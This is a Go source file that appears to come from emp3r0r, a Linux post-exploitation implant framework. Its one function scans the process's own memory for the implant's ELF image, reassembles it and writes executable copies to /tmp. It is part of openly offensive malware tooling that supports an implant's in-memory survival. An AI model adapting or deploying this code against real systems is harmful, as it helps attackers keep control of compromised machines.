//go:build linux
// +build linux

package util

import (
	"bytes"
	"fmt"
	"os"

	"github.com/jm33-m0/emp3r0r/core/internal/emp3r0r_def"
	"github.com/jm33-m0/emp3r0r/core/internal/exe_utils"
)

// FindEmp3r0rELFInMem search process memory for emp3r0r ELF
// FIXME Not working when using loaders
func FindEmp3r0rELFInMem() (elf_bytes []byte, err error) {
	mem_regions, err := DumpSelfMem()
	if err != nil {
		err = fmt.Errorf("cannot dump self memory: %v", err)
		return
	}
	elf_header := new(exe_utils.ELFHeader)

	parseMemRegions := func(base int64) (start, end int64, err error) {
		for _, p := range elf_header.ProgramHeaders {
			if p.Vaddr == uint64(base) {
				start = int64(p.Vaddr)
				end = start + int64(p.Filesz)
				break
			}
		}
		return
	}

	for base, mem_region := range mem_regions {
		if bytes.Contains(mem_region, exe_utils.ELFMAGIC) && bytes.Contains(mem_region, emp3r0r_def.OneTimeMagicBytes) {
			if base != 0x400000 {
				LogDebug("Found magic string in memory region 0x%x, but unlikely to contain our ELF", base)
				continue
			}
			LogDebug("Found magic string in memory region 0x%x", base)

			// verify if it's a valid config data and thus the emp3r0r ELF
			_, err := DigEmbeddedData(mem_region, base)
			if err != nil {
				LogDebug("Verify config data: %v", err)
				continue
			}
			LogDebug("Found emp3r0r ELF in memory region 0x%x", base)

			// parse ELF headers
			elf_header, err = exe_utils.ParseELFHeaders(mem_region)
			if err != nil {
				LogDebug("Parse ELF headers: %v", err)
				continue
			}
			elf_header.Print()

			// start_of_current_region reading from base
			current_region := mem_regions[base]
			start_of_current_region := base // current pointer
			end_of_current_region := start_of_current_region + int64(len(current_region))
			// refine the start/end of current region using program headers
			start, end, err := parseMemRegions(start_of_current_region)
			if err != nil {
				LogDebug("parseMemRegions: %v", err)
				continue
			}
			LogDebug("Parsing memory region 0x%x - 0x%x", start_of_current_region, end_of_current_region)
			LogDebug("Saving %d bytes from memory region 0x%x - 0x%x", end-start, start, end)
			elf_data := current_region[start-start_of_current_region : end-start_of_current_region]
			os.WriteFile("/tmp/emp3r0r.restored.1", elf_data, 0o755)

			// read on
			start_of_current_region = end_of_current_region
			current_region = mem_regions[start_of_current_region]
			end_of_current_region = start_of_current_region + int64(len(current_region))
			// refine the start/end of current region using program headers
			start, end, err = parseMemRegions(start_of_current_region)
			if err != nil {
				LogDebug("parseMemRegions: %v", err)
				continue
			}
			LogDebug("Parsing memory region 0x%x - 0x%x", start_of_current_region, end_of_current_region)
			LogDebug("Saving %d bytes from memory region 0x%x - 0x%x", end-start, start, end)
			elf_data = append(elf_data, current_region[start-start_of_current_region:end-start_of_current_region]...)
			os.WriteFile("/tmp/emp3r0r.restored.2", current_region, 0o755)

			// read on, it doesn't matter if we read too much, the ELF will still run
			start_of_current_region = end_of_current_region
			current_region = mem_regions[start_of_current_region]
			end_of_current_region = start_of_current_region + int64(len(current_region))
			// refine the start/end of current region using program headers
			start, end, err = parseMemRegions(start_of_current_region)
			if err != nil {
				LogDebug("parseMemRegions: %v", err)
				continue
			}
			LogDebug("Parsing memory region 0x%x - 0x%x", start_of_current_region, end_of_current_region)
			LogDebug("Saving %d bytes from memory region 0x%x - 0x%x", end-start, start, end)
			elf_data = append(elf_data, current_region[start-start_of_current_region:end-start_of_current_region]...)
			os.WriteFile("/tmp/emp3r0r.restored.3", current_region, 0o755)

			LogDebug("Saved %d bytes to EXE_MEM_FILE", len(elf_data))
			elf_bytes = elf_data
			break
		}
	}
	if len(elf_bytes) <= 0 {
		err = fmt.Errorf("no emp3r0r ELF found in memory")
		return
	}

	return
}
